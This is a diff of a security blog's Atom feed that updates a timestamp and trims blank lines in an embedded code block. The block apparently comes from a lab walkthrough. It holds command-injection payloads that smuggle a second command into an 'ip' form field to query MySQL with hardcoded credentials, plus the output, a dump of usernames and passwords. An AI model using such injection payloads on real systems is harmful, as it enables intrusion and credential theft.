@@ -4,7 +4,7 @@
   <title><![CDATA[0x41414141]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-05-11T21:19:46+02:00</updated>
+  <updated>2015-05-11T21:19:51+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -288,7 +288,6 @@ mysql database:</p>
 <span class='line-number'>8</span>
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
-<span class='line-number'>11</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 echo show databases|mysql -ujohn -phiroshima&submit=submit
 </span><span class='line'>Database
 </span><span class='line'>mysql
@@ -296,7 +295,6 @@ mysql database:</p>
 </span><span class='line'>webapp
 </span><span class='line'>
 </span><span class='line'>ip=127.0.0.1 %26%26 echo 'use webapp; show tables'|mysql -ujohn -phiroshima&submit=submit
-</span><span class='line'>
 </span><span class='line'>id    username    password
 </span><span class='line'>1 admin   5afac8d85f
 </span><span class='line'>2 john    66lajGGbla</span></code></pre></td></tr></table></div></figure>
